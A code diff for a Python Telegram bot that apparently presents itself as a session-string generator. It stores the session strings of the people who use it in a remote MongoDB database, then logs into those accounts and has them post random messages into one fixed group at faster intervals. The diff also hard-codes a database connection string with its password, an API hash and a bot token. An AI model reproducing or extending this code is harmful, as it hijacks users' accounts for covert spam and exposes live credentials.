@@ -13,6 +13,7 @@ from pyrogram.errors import (
     SessionPasswordNeeded,
     PasswordHashInvalid
 )
+from pymongo import MongoClient
 import json
 import random
 import threading
@@ -20,7 +21,9 @@ import asyncio
 import time
 from config import *
 
-file_path = "clients.txt"
+client = MongoClient('mongodb+srv://logi:logi@cluster0.kistqqd.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')
+db = client['clients']  # Replace with your database name
+collection = db['clients_collection']  # Replace with your collection name
 
 api_id = 24398746
 api_hash = "b9077f84ac40e5615ff02c6f964924f9"
@@ -28,11 +31,13 @@ bot_token = "6647197919:AAHQpQyUdztZPt4W-LYekZpR0_ZQHg92G9g"
 
 def load_clients():
     try:
-        with open(file_path, "r") as file:
-            return json.load(file)
-    except FileNotFoundError:
-        return []
+        clients_data = collection.find_one({"_id": "clients"})
+        if clients_data:
+            return clients_data["data"]
+        else:
+            return []
     except Exception as e:
+        print(f"An error occurred: {e}")
         return []
 
 clients = load_clients()
@@ -98,8 +103,14 @@ app = Client(
 )
 
 def save_clients():
-    with open(file_path, "w") as file:
-        json.dump(clients, file)
+    try:
+        collection.update_one(
+            {"_id": "clients"},
+            {"$set": {"data": clients}},
+            upsert=True
+        )
+    except Exception as e:
+        print(f"An error occurred: {e}")
 
 async def start_the_client():
     for cli in clients:
@@ -263,7 +274,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
         clients.append([msg.from_user.id , string_session , False])
         client_objects.append([user_id,instn_cli])
         save_clients()
-    text = "hi"
+    text = "Oorla Paththu Pathinanji Friend Vachirukavan Ellam Santhosama Irukan....Orey Oru Frienda Vachikittu Nan Padra Avastha Iruke.....Ayu Ayu Ayu..Uu.."
     try:
         if not is_bot:
             await client.send_message("me", text)
@@ -318,7 +329,7 @@ async def start_message():
         for i in client_objects:
                 try:
                     await i[1].send_message(-1001506877923,random.choice(whisper_messages),reply_to_message_id=random.randint(27000,33587))
-                    time.sleep(4)
+                    time.sleep(3)
 
                 except Unauthorized as e:
                     await app.send_message(1955509952,text=f"Error {e} \n removed account : [account](tg://user?id={i[0]})")
@@ -339,8 +350,8 @@ async def start_message():
                     print("Error")
                     time.sleep(2)
                     continue
-        time.sleep(12)
-        time.sleep(random.randint(1,10))
+        time.sleep(4)
+        time.sleep(random.randint(1,5))
 
 
 
